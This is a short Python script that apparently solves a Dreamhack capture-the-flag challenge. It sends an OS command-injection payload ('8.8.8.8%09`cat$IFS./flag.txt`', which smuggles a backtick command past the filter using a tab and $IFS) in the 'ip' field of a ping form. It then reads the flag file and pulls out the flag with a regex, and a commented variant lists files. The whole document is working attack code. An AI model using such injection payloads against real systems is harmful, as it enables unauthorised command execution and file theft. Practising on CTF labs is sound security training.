import requests
import re

URL = "http://host3.dreamhack.games:22137"

# test_payload = '8.8.8.8%09`ls$IFS-t`'
payload = '8.8.8.8%09`cat$IFS./flag.txt`'

data = {
    'ip': payload
}

res = requests.post(URL+'/ping', data=data)
match = re.search(r'DH\{[^}]*\}', res.text)
print(match.group(0))
